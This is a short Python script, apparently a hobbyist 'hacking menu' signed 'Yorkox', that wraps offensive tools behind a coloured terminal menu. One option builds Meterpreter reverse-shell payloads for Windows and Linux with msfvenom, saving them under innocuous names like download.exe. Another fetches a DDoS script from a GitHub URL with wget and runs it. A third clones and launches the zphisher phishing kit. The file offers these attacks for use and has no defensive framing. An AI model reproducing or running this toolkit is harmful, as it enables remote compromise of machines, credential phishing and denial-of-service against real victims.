import os, time

#   <--Menu-->
def menu():
    os.system("clear")
    print(chr(27)+"[1;31m"+"Y0RKOX M3NU")
    print(chr(27)+"[1;35m"+"")
    time.sleep(1)
    print("1 -->> MsfVenom T00L")
    time.sleep(1)
    print("2 -->> DDoS T00LS")
    time.sleep(1)
    print("3 -->> Phishing")
    time.sleep(1)
    print("4 -->> Exit")
    print(chr(27)+"[1;32m"+"")
    time.sleep(1)
    option = input("--->> ")
    print(chr(27)+"[1;34m"+"")
    
    if option == "1":
        msf()

    if option == "2":
        ddos()

    if option == "3":
        phishing()

    if option == "4":
        print("Bye...")
        time.sleep(1)
        os.system("clear")
        exit()

def msf():
    os.system("clear")
    print(chr(27)+"[1;31m"+"Metasploit")
    print("")
    print("1 -->> Windows reverse shell")
    print("2 -->> Linux reverse shell x86")
    print("3 -->> Linux reverse shell x64")
    print("4 -->> Exit")
    print("")
    x = input("--->> ")
    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe > download.exe")
        print(chr(27)+"[1;31m"+"FileName == download.exe")
        time.sleep(3)
        while True:
            msf()
    
    if x == "2":
        print(chr(27)+"[1;32m"+"")
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf > downloadx86.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx86.elf")
        time.sleep(3)
        while True:
            msf()

    if x == "3":
        print(chr(27)+"[1;32m"+"")
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf > downloadx64.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx64.elf")
        time.sleep(3)
        while True:
            msf()
    
    if x == "4":
        menu()

def ddos():
    os.system("clear")
    print(chr(27)+"[1;31m"+"DDOS")
    print("")
    print("1 -->> Download tool")
    print("2 -->> Execute tool")
    print("3 -->> Exit")
    print("")
    x = input("--->> ")
    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Downloading...")
        time.sleep(1)
        os.system("wget https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py")
        print(chr(27)+"[1;31m"+"Download Succesfull!!")
        time.sleep(2)
        while True:
            ddos()
    
    if x == "2":
        print("")
        print("Executting...")
        time.sleep(1)
        os.system("python3 ddos.py")

    if x == "3":
        menu()

def phishing():
    os.system("clear")
    print(chr(27)+"[1;31m"+"Phishing")
    print("")
    print("1 -->> Download tool")
    print("2 -->> Execute tool")
    print("3 -->> Exit")
    print("")
    x = input("--->> ")
    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Downloading...")
        time.sleep(1)
        os.system("git clone https://github.com/htr-tech/zphisher")
        print(chr(27)+"[1;31m"+"Download Succesfull!!")
        time.sleep(2)
        while True:
            phishing()
    
    if x == "2":
        print("")
        print("Executting...")
        time.sleep(1)
        os.system("mv zphisher/.sites .")
        time.sleep(1)
        os.system("bash zphisher/zphisher.sh")

    if x == "3":
        menu()

print(chr(27)+"[1;36m"+"Created by Yorkox")
print(chr(27)+"[1;31m"+"")
if input("Continue? s/n --->> ") == "s":
    menu()
else:
    exit("Bye")
